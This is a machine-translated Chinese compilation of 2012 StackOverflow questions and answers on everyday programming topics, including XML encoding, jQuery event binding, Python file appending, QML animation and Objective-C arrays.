# StackOverflow 问答 11847000-11847999

# xml - 具有相同内容的 xml 文件被不同地解析

> ID：11847001
> 
> 赞同：1
> 
> 时间：2012-08-07T13:22:48.200
> 
> 标签：xml, encoding, coldfusion, xml-parsing, cdata

我有一个 xml 文件。

```
<?xml version="1.0" encoding="UTF-8"?>
<channel>
    <item>content with special character é</item>
</channel> 
```

假设上面是 xml 文件，除了产品目录中的内容，还有更多的标签和内容。这是使用以下过程创建的：

1.  从coldfusion文件调用数据库
2.  使用过程从数据库中获取内容并返回到coldfusion文件
3.  在coldfusion中创建一个xml文件（只需使用文件名，例如：“filename.xml”）
4.  通过在coldfusion中循环查询并将每个产品的产品添加到xml文件中，将内容写入文件

当我尝试在 Firefox 中打开文件时，这给了我错误（我测试 xml 文件解析的方式）。告诉我我有一些特殊字符需要转义（“xml 格式不正确”或类似的东西）。所以我将 CDATA 标签放在这些 xml 标签中，这应该可以解决这个问题，对吧？它没有。它一直在遇到特殊字符，而不仅仅是为 xml 保留的字符（&、<、>、..）。

这是我开始失去它的时候。在手动创建较小的 xml 文件（而不是通过冷融合）进行了一些尝试和测试之后，我只需删除 CDATA 标记并插入上面的代码就可以使用它。Firefox 可以很好地解析上述代码。所以经过一番思考，我只是将错误文件的全部内容（原始文件）复制到了一个全新的手动创建的 xml 文件（.txt --> 重命名为 .xml），瞧，没有更多错误了。

有人可以向我解释一下，在这种情况下，从第一个复制到第二个内容完全相同的 2 个单独文件如何以不同方式解析。第一个在特殊字符上显示多个错误，第二个对这些完全没有问题..？拜托，有人，在我在这里发狂之前……>_>

**编辑 1：** 当我说特殊字符时，我特别指的是 utf-8 字符。我不是在谈论为 xml 保留的字符（&、<、>、...），我已经转义了这些字符。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T13:38:00.313

您给出的示例中没有特殊字符，只有普通字符，例如`c`, `é`, `（我想空格有点特殊）等。`

 `我会根据您的描述猜测您使用的编码不正确。你说它是 UTF-8，但它是真的吗？

如果这是问题所在，您有三个解决方案：

1.  修复以 UTF-8 写入文件的代码。
2.  修复代码以描述它实际所在的编码（在 HTTP 标头和 XML 声明中都这样做）。
3.  一直说它是 UTF-8，但转义 US-ASCII 范围之外的任何字符（U+0000 到 U+007F）。例如，您将上述内容输出为：

（添加此虚拟行是因为解析器似乎不喜欢列表之后的代码块）

```
<?xml version="1.0" encoding="UTF-8"?>
<channel>
    <item>content with special character &#xe9;</item>
</channel> 
```

第一个是最好的选择，但其他两个则有利有弊。支持数字 2，它不会转义尽可能多的不需要转义的字符。支持数字 3，只有 UTF-8 和 UTF-16**必须**被 XML 解析器接受，并且以这种方式伪造它适用于任何与 UTF-8 相同的字符集，范围为 U+0000 到 U+ 007F，其中有很多。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T23:03:46.413

我使用 XmlFormat() 来格式化 xml 文件中的数据。也许这会解决你的问题。

```
<?xml version="1.0" encoding="UTF-8"?>
<channel>
    <item>#XmlFormat(field_from_database, true)#</item>
</channel> 
````

# ravendb - 来自 RavenDB 空间查询的距离值

> ID：11847004
> 
> 赞同：2
> 
> 时间：2012-08-07T13:22:59.243
> 
> 标签：ravendb, geospatial

有没有办法在进行空间搜索时从 RavenDB 获取距离计算值。我尝试将建议的
_ = SpatialIndex.Generate(r.Latitude, r.Longitude) 转换为 distance = SpatialIndex.Generate(r.Latitude, r.Longitude)

没有得到一个值回来。

我们的目标是在我们的网页上以英里为单位显示距离。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-07T16:52:37.760

埃里克，你有经纬度，你可以在记忆中做数学。

# python - 从python中文本文件中的特定行开始迭代

> ID：11847006
> 
> 赞同：3
> 
> 时间：2012-08-07T13:23:05.340
> 
> 标签：python

假设我有一个文本文件（名为 test.txt），之前在我的 Python 脚本中我已经在其中写入了 15 行。现在，我想在该文件中添加一些行。如何从 test.txt 的第 16 行开始迭代并在 Python 中添加一些新行？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-07T13:24:45.757

要在文件末尾追加，您不需要“迭代”它——只需在追加模式下打开它：

```
with open("my_file", "a") as f:
    f.write("another line\n") 
```

遍历文件可以用来*读取*它们，而不是用来*写入*它们。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T13:26:01.033

当您“打开”文件时，使用常规

```
f = open(FILE) 
```

你应该说明你正在使用的方法，在这种情况下，追加，所以

```
f = open(FILE, 'a') 
```

# java - java动态属性表

> ID：11847007
> 
> 赞同：1
> 
> 时间：2012-08-07T13:23:13.143
> 
> 标签：java, json, serialization, hashmap

我正在开发一个需要用于动态属性的特殊组件的 java 应用程序。参数被序列化（使用 JSON）并存储在数据库中，然后在运行时反序列化。所有属性都显示在具有 3 列（属性名称、属性类型和属性值）的 JTable 中，并存储在哈希图中。

我目前有两个问题需要解决：

1.  hashmap 还可以存储对象，并且可以将对象设置为 null。如果设置为 null 我不知道它们属于哪个类。即使对象为空并且知道它们属于哪个类，我如何存储它们？我是否需要将每个对象包装在一个包含存储对象类的类中？

2.  对象在运行时从 json 反序列化。这样做的问题是有许多不同类型的对象，我实际上并不知道将存储在哈希图中的所有对象类型。所以我正在寻找一种动态反序列化对象的方法。有没有这样的方法？我是否必须将对象的类存储在序列化的 json 字符串中？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T14:34:48.410

1.  看看**Null Object Pattern**。您可以使用额外的类来表示您的类型的 Null 实例，并且仍然可以包含有关其自身的信息。

2.  有一种叫做**Class Token**的东西，它使用 Class 对象作为异构容器的键。查看*Joshua Bloch 撰写的 Effective Java，第 29 条*。我不确定这种方法如何为您工作，因为您可能有许多相同类型的实例，但我将其作为参考。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-06-21T14:50:07.633

首先，您能解释一下为什么要对属性使用 JSON 序列化吗？

在我看来，这种方法在很多方面都是不利的，它可能会导致数据库搜索和索引出现问题，使数据库查看变得痛苦并在您的应用程序中造成不必要的代码。这些问题可能不是问题，这取决于您希望如何使用您的属性。

我对这种情况的解决方案是包含以下列的简单表：

1.  id - 整数
2.  属性名 - varchar

然后为每种支持的数据类型添加列：

3.  string_value - varchar
4.  整数值 - 整数
5.  date_value - 日期

...以及您想要的任何其他类型。

这种设计允许使用简单且类型安全的 ORM 映射实现最高性能，而无需任何序列化或其他样板。它可以存储任何类型的值，您只需为属性类型设置正确的列，将所有其他的列保留为空。您可以通过在所有数据列中使用 null 来模拟 null 值。索引和搜索也变得轻而易举。

# php - 如何在多对多关系中使用 Zend_Db_Table

> ID：11847009
> 
> 赞同：0
> 
> 时间：2012-08-07T13:23:20.290
> 
> 标签：php, zend-framework, many-to-many, relational-database

如何使用 Zend 的[Zend_Db_Table](http://framework.zend.com/manual/en/zend.db.table.html)与联结表[的多对多关系？](http://en.wikipedia.org/wiki/Many-to-many_%28data_model%29)是否有任何内置方法提供这种虚构性或必须编写简单的 SQL？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T15:44:00.033

它在文档中：[通过多对多关系获取行集](http://framework.zend.com/manual/en/zend.db.table.relationships.html#zend.db.table.relationships.fetching.many-to-many)

要获取一行：

```
$row->findManyToManyRowset($table,
                           $intersectionTable,
                           [$rule1,
                               [$rule2,
                                   [Zend_Db_Table_Select $select]
                               ]
                           ]);
// Example
$productsRowset = $bug1234->findManyToManyRowset('Products',
                                                 'BugsProducts');
// Here, BugsProducts is the junction table 
```

但是，对于一对多关系，您还需要在类中定义关系：[定义关系](http://framework.zend.com/manual/en/zend.db.table.relationships.html#zend.db.table.relationships.defining)。

# qt - QML NumberAnimation.duration 行为

> ID：11847010
> 
> 赞同：1
> 
> 时间：2012-08-07T13:23:25.983
> 
> 标签：qt, animation, qml, game-physics

我试图让玩家顺利地向 QML 中的目的地移动。我正在使用 a`NumberAnimation`为 x,y 位置变化设置动画。的`NumberAnimation`持续时间应该与玩家必须行进的距离成正比，这样玩家就可以以相同的速度移动，而不管他们离目的地有多远。

```
import QtQuick 1.1

Item {
    width: 720
    height: 720

    MouseArea {
        anchors.fill: parent
        onClicked: {
            var newXDest = mouse.x - player.width / 2;
            var newYDest = mouse.y - player.height / 2;
            var dist = player.distanceFrom(newXDest, newYDest);
            // Make duration proportional to distance.
            player.xMovementDuration = dist; // 1 msec per pixel
            player.yMovementDuration = dist; // 1 msec per pixel
            console.log("dist = " + dist);
            player.xDest = newXDest;
            player.yDest = newYDest;
        }
    }

    Rectangle {
        id: player
        x: xDest
        y: yDest
        width: 32
        height: 32
        color: "blue"
        property int xDest: 0
        property int yDest: 0
        property int xMovementDuration: 0
        property int yMovementDuration: 0

        function distanceFrom(x, y) {
            var xDist = x - player.x;
            var yDist = y - player.y;
            return Math.sqrt(xDist * xDist + yDist * yDist);
        }

        Behavior on x {
            NumberAnimation {
                duration: player.xMovementDuration
//                duration: 1000
            }
        }

        Behavior on y {
            NumberAnimation {
                duration: player.yMovementDuration
//                duration: 1000
            }
        }
    }

    Rectangle {
        x: player.xDest
        y: player.yDest
        width: player.width
        height: player.height
        color: "transparent"
        border.color: "red"
    }
} 
```

我的问题可以通过运行上面的应用程序并执行以下步骤来证明：

1.  单击屏幕的右下角。
2.  立即单击屏幕的中心（或更靠近左上角）。

在第二次单击时（当矩形仍在移动时），矩形的数字动画似乎停止了（这是我想要的），但它假定了目的地的位置（不是我想要的）。相反，我希望动画停止并且矩形呈现它停止的位置，然后继续到新的目的地。

正确的行为 - 忽略移动速度变得不成比例 - 可以通过将两个`NumberAnimation.duration`s 设置为 1000 来查看。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T01:09:04.623

我认为您正在寻找 SmoothedAnimation。只有两种类型的动画可以很好地处理动画完成之前目的地的变化。那就是 SmoothedAnimation 和 SpringAnimation。这两者都使用当前位置和速度来确定下一帧中的位置。其他动画类型沿预定曲线移动位置。

只需将 NumberAnimation 更改为 SmoothedAnimation 即可使您的示例对我来说看起来正确。

# php - 在使用 PDO 插入记录后获取 mysql 最后插入 id

> ID：11847013
> 
> 赞同：3
> 
> 时间：2012-08-07T13:23:32.307
> 
> 标签：php, mysql, pdo

我使用 PDO 准备好的语句来插入记录。并使用[lastInsertId](http://php.net/manual/en/pdo.lastinsertid.php)获取插入记录的 id。但是这样好吗？

因为当多个用户同时插入时会发生什么？lastInsertId 在那种情况下会发生冲突吗？所以我应该使用交易？

请帮忙

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T13:26:41.300

它会返回正确的ID，不用担心。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-07T13:27:11.517

每个 PHP 脚本基本上都是独立存在的。当多个用户同时插入时，用户 A 将获得他最后一次插入的行 idA，用户 B 将获得她最后一次插入的行 idB。

# css - 如何在 div 内以居中图像居中 div？

> ID：11847019
> 
> 赞同：0
> 
> 时间：2012-08-07T13:24:00.187
> 
> 标签：css, html, centering

我希望在每个 DIV 中居中放置一个图像，该图像在较大的 DIV 中向左浮动。

在以下示例中，我希望灰色框（“assetInfoBody”）位于绿色框（“assetBox”）的中心。除了 text-align:center 和 margin:auto 之外，我还能在这里尝试什么？

![在此处输入图像描述](../Images/70da894b1e3816b7745fc7fdb6a33d25.png)

```
<!DOCTYPE html>
<html>
    <head>
        <style type="text/css">
            #assets {
                background-color: orange;
                padding: 5px;
                width: 100%;
                height: 100%;
            }
            .assetbox {
                background-color: lightgreen;
                float: left;
                width: 100px;
                margin-right: 5px;
                            text-align: center;
            }

            .assetInfoBody {
                background-color: grey;
                position: relative;
                width: 80px;
                text-align: center;
            }

            .centeredItem {
                margin-left: auto;
                margin-right: auto;
                top: 0px;
            }

        </style>
    </head>
    <body>
        <div id="assets">
            <div class="assetbox">
                <div class="assetInfoBody">
                    <div class="centeredItem">
                        <img src="images/box.png"/>
                    </div>
                </div>
            </div>
            <div class="assetbox">
                <div class="assetInfoBody">
                    <div class="centeredItem">
                        <img src="images/box.png"/>
                    </div>
                </div>
            </div>
            <div class="assetbox">
                <div class="assetInfoBody">
                    <div class="centeredItem">
                        <img src="images/box.png"/>
                    </div>
                </div>
            </div>
        </div>
    </body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T13:41:20.063

请参阅[此示例](http://jsfiddle.net/JY4eN/1/)以获取有关如何实现此目的的参考。由于您的`.assetInfoBody`班级有一个固定的宽度，您可以`.centeredItem`通过对其应用规则`margin:0 auto`来对齐。通过也适用`text-align:center`于`.centeredItem`您，您可以始终保持图像居中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T13:43:25.373

可能你想要这样的 CSS：

```
#assets {
  background-color: orange;
  padding: 5px;
  width: 100%;
}
.assetbox {
  background-color: lightgreen;
  display: inline-block;
  width: 100px;
  margin-right: 5px;
}

.assetInfoBody {
  background-color: grey;
  margin: 0 auto !important;
  width: 80px;
}

.centeredItem {
  margin-left: auto;
  margin-right: auto;
} 
```

# javascript - jQuery 的 .bind() 与 .on()

> ID：11847021
> 
> 赞同：216
> 
> 时间：2012-08-07T13:24:14.807
> 
> 标签：javascript, jquery, jquery-selectors

我发现了两篇关于新功能的精彩文章`.on()`：[jquery4u.com](http://www.jquery4u.com/jquery-functions/on-vs-live-review/#.UCEUoKPrFI0)和[elijahmanor.com](http://www.elijahmanor.com/2012/02/differences-between-jquery-bind-vs-live.html)。

有什么方法`.bind()`比 still 更好用`.on()`吗？

例如，我有一个示例代码，如下所示：

```
$("#container").click( function( e ) {} ) 
```

您可以注意到，选择器只检索了一个项目，在我的情况下，当我的页面加载时，该`<div>`名称`#container`已经存在；不是动态添加的。值得一提的是，我使用的是最新版本的 jQuery：1.7.2。

对于该示例，即使我不使用该功能提供的其他功能，也应该`.on()`使用它来代替？`.bind()``.on()`

* * *

## 回答 #1

> 赞同：326
> 
> 时间：2012-08-07T13:26:35.457

在内部，`.bind`直接映射到`.on`当前版本的 jQuery。（对于`.live`. 也是如此。）因此，如果您使用它，性能会受到很小但实际上微不足道的影响`.bind`。

但是，`.bind`可能会随时从未来版本中删除。没有理由继续使用`.bind`，也没有理由更喜欢`.on`。

* * *

## 回答 #2

> 赞同：59
> 
> 时间：2012-08-07T13:29:46.773

这些片段都执行完全相同的事情：

```
element.on('click', function () { ... });
element.bind('click', function () { ... });
element.click(function () { ... }); 
```

但是，它们与这些非常不同，它们都执行相同的操作：

```
element.on('click', 'selector', function () { ... });
element.delegate('click', 'selector', function () { ... });
$('selector').live('click', function () { ... }); 
```

第二组事件处理程序使用[事件委托](http://www.sitepoint.com/javascript-event-delegation-is-easier-than-you-think/)，并且适用于动态添加的元素。使用委托的事件处理程序也具有更高的性能。第一组不适用于动态添加的元素，并且性能更差。

jQuery 的`on()`函数没有引入任何不存在的新功能，它只是尝试标准化 jQuery 中的事件处理（您不再需要在 live、bind 或 delegate 之间做出决定）。

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2012-08-07T13:42:59.140

直接方法 和`.delegate`是优于它们的 API，`.on`并且无意弃用它们。

直接方法更可取，因为您的代码的字符串类型较少。当您输入错误的事件名称而不是静默错误时，您将立即收到错误。`click`在我看来，它也比写和读更容易`on("click"`

由于参数的顺序，The`.delegate`优于：`.on`

```
$(elem).delegate( ".selector", {
    click: function() {
    },
    mousemove: function() {
    },
    mouseup: function() {
    },
    mousedown: function() {
    }
}); 
```

你马上就知道它是委托的，因为它说的是委托。您还可以立即看到选择器。

现在`.on`还不清楚它是否已被委派，您必须查看选择器的末尾：

```
$(elem).on({
    click: function() {
    },
    mousemove: function() {
    },
    mouseup: function() {
    },
    mousedown: function() {
    }
}, "selector" ); 
```

现在，这个名字`.bind`真的很糟糕，表面上比`.on`。但是`.delegate`不能执行非委托事件，并且有些事件没有直接方法，因此在这种罕见的情况下可以使用它，但这只是因为您想在委托事件和非委托事件之间进行清晰的分离。

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2012-08-07T13:28:37.713

如果您查看源代码，`$.fn.bind`您会发现它只是一个重写函数`on`：

```
function (types, data, fn) {
    return this.on(types, null, data, fn);
} 
```

[http://james.padolsey.com/jquery/#v=1.7.2&fn=$.fn.bind](http://james.padolsey.com/jquery/#v=1.7.2&fn=%24.fn.bind)

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2012-08-07T13:27:19.960

来自 jQuery 文档：

> 从 jQuery 1.7 开始，.on() 方法是将事件处理程序附加到文档的首选方法。对于早期版本，.bind() 方法用于将事件处理程序直接附加到元素。处理程序附加到 jQuery 对象中当前选定的元素，因此这些元素必须存在于调用 .bind() 的位置。有关更灵活的事件绑定，请参阅 .on() 或 .delegate() 中有关事件委托的讨论。

[http://api.jquery.com/bind/](http://api.jquery.com/bind/)

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2016-12-01T21:18:23.073

从 Jquery 3.0 及更高版本开始， .bind 已被弃用，他们更喜欢使用 .on 。正如@Blazemonger 之前回答的那样，它可能会被删除，并且肯定会被删除。对于旧版本 .bind 也会在内部调用 .on ，它们之间没有区别。另请参阅 api 以获取更多详细信息。

[.bind() 的 jQuery API 文档](http://api.jquery.com/bind/)

# objective-c - 当数组没有任何内容时如何取出数组的第一个组件

> ID：11847026
> 
> 赞同：1
> 
> 时间：2012-08-07T13:24:30.687
> 
> 标签：objective-c, ios, xcode, nsarray

我做了一个只有项目符号的文本视图。它的工作原理就像 word 中的项目符号列表。现在我正在使用此代码创建一个数组，以通过项目符号 (\u2022) 分隔字符串

```
//get the text inside the textView
NSString *textContents = myTextView.text;

//make the array
NSArray *bulletedArray = [textContents componentsSeparatedByString:@"\u2022"];

//print out array 
NSLog(@"%@",bulletedArray); 
```

它可以完美地通过项目符号将文本分成组件，但它保留了第一行，其中没有任何内容。所以当它打印出来时，它看起来像这样。

```
"",
"Here is my first statement\n\n",
"Here is my second statement.\n\n",
"This is my third statement. " 
```

数组的第一个组件是“”（无）。有没有办法避免添加等于 nil 的组件？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T13:28:52.417

可悲的是，这是工作`componentsSeparatedBy...`方法的方式`NSString`：

> 分隔符的相邻出现会在结果中产生空字符串。同样，如果字符串以分隔符开头或结尾，则第一个或最后一个子字符串分别为空。

由于您知道第一个元素将始终为空，因此您可以从 element 开始创建一个子数组`1`：

```
NSArray *bulletedArray = [textContents componentsSeparatedByString:@"\u2022"];
NSUInteger len = bulletedArray.count;
if (bulletedArray.count) {
    bulletedArray = [bulletedArray subarrayWithRange:NSMakeRange(1, len-1)];
} 
```

或者，您可以`substringFromIndex:`在将字符串传递给方法之前使用从字符串中删除初始项目符号字符`componentsSeparatedByString:`：

```
NSArray *bulletedArray = [
    [textContents substringFromIndex:[textContents rangeOfString:@"\u2022"].location+1]
    componentsSeparatedByString:@"\u2022"]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T13:56:45.197

虽然您的项目符号列表总是在索引 1 上有一个项目符号，但您可以简单地从字符串中删除第一个索引：

```
//get the text inside the textView
if (myTextView.text.length > 1) {
    NSString *textContents =[myTextView.text substringFromIndex:2];

    //make the array
    NSArray *bulletedArray = [textContents componentsSeparatedByString:@"\u2022"];

    //print out array    
    NSLog(@"%@",bulletedArray);     
} 
```

当然，您应该避免使用空文本，而这会导致 arrayOutOfBounds 异常。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-07T13:28:42.577

```
[[NSMutableArray arrayWithArray:[textContents componentsSeparatedByString:@"\u2022"]] removeObjectIdenticalTo:@""]; 
```

这应该够了吧

# concurrency - 在 clojure 中创建 10k+ 个代理

> ID：11847033
> 
> 赞同：2
> 
> 时间：2012-08-07T13:24:43.997
> 
> 标签：concurrency, clojure, actor, agents

正如我测试的那样，当我创建它们时，每个新代理都使用一个单独的线程。多个代理可以在一个线程中运行吗？

我的想法是创建 10K+ 轻量级代理（就像 erlang 中的演员），那么这对 Clojure 来说是一个挑战吗？

谢谢

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-07T13:28:06.637

这是不正确的。代理使用的线程池是核心数 + 2 大小。因此，在四核机器上，即使 10k+ 代理也只会使用 6 个工作线程。

，`send`即。将`send-off`启动新线程。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-07T16:11:33.647

考虑使用 jucDelayQueue

这是它如何工作的草图，

*(`delayed-function`这里有点麻烦，但它基本上构造了一个 jucDelayed 的实例，用于提交到队列中。)*

```
(import [java.util.concurrent Delayed DelayQueue TimeUnit])

(defn delayed-function [f]
  (let [execute-time    (+ 5000 (System/currentTimeMillis))
        remaining-delay (fn [t] (.convert t 
                                          (- execute-time 
                                              (System/currentTimeMillis))
                                          TimeUnit/MILLISECONDS))]
  (reify
      Delayed    (getDelay [_ t] (remaining-delay t))
      Runnable   (run [_] (f))
      Comparable (compareTo [_ _] 0))))

;;; Use java's DelayQueue from clojure.
;;; See http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/DelayQueue.html

(def q (DelayQueue.))

(defn delayed 
  "put the function f on the queue, it will only execute after the delay 
   expires"
  [f]
  (.offer q (delayed-function f)))

(defn start-processing 
  "starts a thread that endlessly reads from the delay queue and 
   executes the function found in the queue"
  []
  (.start
   (Thread.
    #(while true
        (.run (.take q))))))

user> (start-processing)
user> (delayed #(println "Hello"))

   ; 5 seconds passes

Hello 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-07T17:56:30.767

[为支持（在我看来很棒）Overtone 音乐合成器而开发的 at-at 库](https://github.com/overtone/at-at/)的`at`功能**为在特定时间点运行功能**提供了一个很好的干净接口。

 **```
(use 'overtone.at-at)
(def my-pool (mk-pool))
(after 1000 #(println "hello from the past!") my-pool) 
```**

# php - SQLite3::createFunction vs 内部 php 函数

> ID：11847039
> 
> 赞同：0
> 
> 时间：2012-08-07T13:25:14.603
> 
> 标签：php, sqlite

与简单的 php 函数相比，使用 SQLite3::createFunction() 有什么优势？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T13:32:38.350

您可以在 SQL 查询中使用它

```
SELECT col1, my_function(col2) FROM tab; 
```

使用 PHP 函数，您必须自己迭代结果集。我不知道它是如何实现的，但据我所知，它`SQLite3`可以与游标一起使用，因此该函数只能在您检索一行时执行。

# jquery - 动画剪辑：rect 属性？

> ID：11847040
> 
> 赞同：8
> 
> 时间：2012-08-07T13:25:14.683
> 
> 标签：jquery, html, css, jquery-animate, clip

我想`clip: rect`用 jQuery为 css 属性设置动画，`.animate()`但在任何地方都找不到。试过：

`$(".img1").animate({ clip: "rect(1px, 945px, 499px, 1px)"
},300);`

没有任何运气。有人知道吗？

谢谢

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-08-07T13:51:58.003

[一切皆有](http://api.jquery.com/animate/#step)可能，但可能有更简单的方法可以不使用`clip`.是这样的：

```
$(".img1").animate({
  fontSize: 100 //some unimportant CSS to animate so we get some values
},
{
  step: function(now, fx) { //now is the animated value from initial css value
      $(this).css('clip', 'rect(0px, '+now+'px, '+now+'px, 0px)')
  }
}, 10000); 
```

[**小提琴**](http://jsfiddle.net/gCGk2/)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-06-27T12:36:45.343

由于这是一个流行的问题，并且当我今天查找此问题时它是 Google 搜索结果的顶部，所以这里有一个 jQuery 插件，它可以与该`clip:`属性一起使用并且是原生的`.animate()`。

信用：http: [//zduck.com/2013/jquery-css-clip-animation-plugin/](http://zduck.com/2013/jquery-css-clip-animation-plugin/)

```
/*
* jquery.animate.clip.js
*
* jQuery css clip animation support -- Joshua Poehls
* version 0.1.4

* forked from Jim Palmer's plugin http://www.overset.com/2008/08/07/jquery-css-clip-animation-plugin/
* idea spawned from jquery.color.js by John Resig
* Released under the MIT license.
*/
(function (jQuery) {

    function getStyle(elem, name) {
        return (elem.currentStyle && elem.currentStyle[name]) || elem.style[name];
    }

    function getClip(elem) {
        var cssClip = $(elem).css('clip') || '';

        if (!cssClip) {
            // Try to get the clip rect another way for IE8.
            // This is a workaround for jQuery's css('clip') returning undefined
            // when the clip is defined in an external stylesheet in IE8\. -JPOEHLS
            var pieces = {
                top: getStyle(elem, 'clipTop'),
                right: getStyle(elem, 'clipRight'),
                bottom: getStyle(elem, 'clipBottom'),
                left: getStyle(elem, 'clipLeft')
            };

            if (pieces.top && pieces.right && pieces.bottom && pieces.left) {
                cssClip = 'rect(' + pieces.top + ' ' + pieces.right + ' ' + pieces.bottom + ' ' + pieces.left + ')';
            }
        }

        // Strip commas and return.
        return cssClip.replace(/,/g, ' ');
    }

    jQuery.fx.step.clip = function (fx) {
        if (fx.pos === 0) {
            var cRE = /rect\(([0-9\.]{1,})(px|em)[,]?\s+([0-9\.]{1,})(px|em)[,]?\s+([0-9\.]{1,})(px|em)[,]?\s+([0-9\.]{1,})(px|em)\)/;

            fx.start = cRE.exec(getClip(fx.elem));
            if (typeof fx.end === 'string') {
                fx.end = cRE.exec(fx.end.replace(/,/g, ' '));
            }
        }
        if (fx.start && fx.end) {
            var sarr = new Array(), earr = new Array(), spos = fx.start.length, epos = fx.end.length,
                emOffset = fx.start[ss + 1] == 'em' ? (parseInt($(fx.elem).css('fontSize')) * 1.333 * parseInt(fx.start[ss])) : 1;
            for (var ss = 1; ss < spos; ss += 2) { sarr.push(parseInt(emOffset * fx.start[ss])); }
            for (var es = 1; es < epos; es += 2) { earr.push(parseInt(emOffset * fx.end[es])); }
            fx.elem.style.clip = 'rect(' +
                parseInt((fx.pos * (earr[0] - sarr[0])) + sarr[0]) + 'px ' +
                parseInt((fx.pos * (earr[1] - sarr[1])) + sarr[1]) + 'px ' +
                parseInt((fx.pos * (earr[2] - sarr[2])) + sarr[2]) + 'px ' +
                parseInt((fx.pos * (earr[3] - sarr[3])) + sarr[3]) + 'px)';
        }
    }
})(jQuery); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-11T02:29:29.417

@Shivan 猛禽

要控制持续时间，请在 step 属性之前添加***duration: 3000 。***因此，代码将说明：

```
$('#A').on('click', function() {

    $(".img1").animate({
      fontSize: 1
    },
    {
      duration:3000,
      step: function(now, fx) {
          $(this).css('clip', 'rect(0px, '+(now+30)+'px, '+(now+30)+'px, 0px)')
      }
    }, 1000);

}); 
```

您必须完全按照您希望动画的运行方式进行操作，但这应该会有所帮助。

# objective-c - iOS：无法将字符串存储在数组中

> ID：11847042
> 
> 赞同：0
> 
> 时间：2012-08-07T13:25:18.297
> 
> 标签：objective-c, ios, json

我正在为 iPhone 开发一个 Facebook Feed 应用程序，除其他外，它可以确定图片是否附加到帖子，并将其存储在数组中。当我运行代码时，我的 NSLogs 告诉我没有任何东西被放入数组中，即使它正在读取是否存在 objectAtKey:@"picture"。以下是我的一些代码。

来自 MasterView.m：

```
//create array containing individual "datas"
NSArray *items = [json objectForKey:@"data"];

for(NSDictionary *item in items)
{
    // store message in ItemStore sharedStore
    if([item objectForKey:@"message"] || [item objectForKey:@"message"] != nil || 
       [[item objectForKey:@"message"] length] > 0){
        [[JSONFeedItemStore sharedStore] createItem:[item objectForKey:@"message"]];
    }

    // 
    if([item objectForKey:@"picture"]){
        [[JSONFeedItemStore sharedStore] createPicture:[[item objectForKey:@"picture"] description]];
        NSLog(@"url: %@", [item objectForKey:@"picture"]);
    } else {
        [[JSONFeedItemStore sharedStore] createPicture:@"http://i.imgur.com/TpIK5.png"]; // blank
        NSLog(@"creating blank picture");
    }
} 
```

来自 ItemStore.m

```
- (void)createPicture:(NSString *)pictureUrl
{
    [pictures addObject:pictureUrl];
    NSLog(@"Number: %d, URL: %@", [pictures count], [pictures objectAtIndex:[pictures count]]);
} 
```

和我的控制台

```
2012-08-07 08:21:54.153 JSONFeed[2502:f803] Number: 0, URL: (null)
2012-08-07 08:21:54.154 JSONFeed[2502:f803] creating blank picture
2012-08-07 08:21:54.155 JSONFeed[2502:f803] Number: 0, URL: (null)
2012-08-07 08:21:54.156 JSONFeed[2502:f803] creating blank picture
2012-08-07 08:21:54.157 JSONFeed[2502:f803] Number: 0, URL: (null)
2012-08-07 08:21:54.157 JSONFeed[2502:f803] url: http://photos-a.ak.fbcdn.net/hphotos-ak-ash4/423482_427478620624383_82270372_s.jpg
2012-08-07 08:21:54.158 JSONFeed[2502:f803] Number: 0, URL: (null)
2012-08-07 08:21:54.158 JSONFeed[2502:f803] creating blank picture 
```

SharedStore 是 ItemStore 类的一部分，用于存储来自 Facebook 帖子的消息和图片。如果您有任何问题，或者需要查看更多代码，请随时提问。我也在接受任何改进建议，因为我对应用程序编程还是新手。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T13:29:27.050

一种可能性是`pictures`零。如果数组不存在，则不能将对象添加到数组中，并且向 nil 发送消息是合法的。您返回的结果也将为零或零，因此您对`-objectAtIndex:`日志的调用“（null）”。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-07T13:32:40.643

一方面，当你做这样的事情时；

```
[array objectAtIndex:[array count]]; 
```

您将获得一个`nil`对象，因为根据定义`objectAtIndex:array.count`超出了数组的范围，因为编程中的所有数组都是 0-indexed

你需要的是

```
[array objectAtIndex([array count]-1)]; 
```

# php - 将 2012 年 8 月 7 日转换为 php 日期格式

> ID：11847044
> 
> 赞同：0
> 
> 时间：2012-08-07T13:25:22.700
> 
> 标签：php, iphone, date, mobile

我正在创建网站的移动版本。在普通版本中，我们只使用 jquery 日期选择器来选择日期。我还没有在移动版本上添加任何类似的东西，因为我的 iPhone 似乎足够聪明，可以意识到它是一个日期字段并给你日期滚动条。

但是在我选择了 2012 年 8 月 7 日的日期之后，我提出了几个问题……这是标准吗？还是我必须为来自不同手机的不同日期格式编码？

最好使用jquery日期选择器吗？（我不确定这是否会非常整洁）。

